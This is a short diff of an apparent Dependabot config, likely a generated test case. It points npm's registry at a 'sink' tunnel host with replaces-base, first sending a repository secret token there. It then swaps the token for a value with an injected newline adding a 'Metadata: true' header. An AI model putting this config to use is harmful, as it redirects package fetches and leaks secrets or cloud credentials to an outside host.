@@ -1,10 +1,10 @@
-# p7r p5c_5c_encq 1790608187
+# p13 p5d_5d_token_lf 1790609864
 version: 2
 registries:
   sink1tunnel:
     type: npm-registry
-    url: https://rand-terms-bytes-subsidiaries.trycloudflare.com/redirc/encq
-    token: ${{secrets.SINK1_TOKEN}}
+    url: https://rand-terms-bytes-subsidiaries.trycloudflare.com/redirc/ctrl
+    token: "tokA123\nMetadata: true"
     replaces-base: true
 updates:
   - package-ecosystem: "npm"
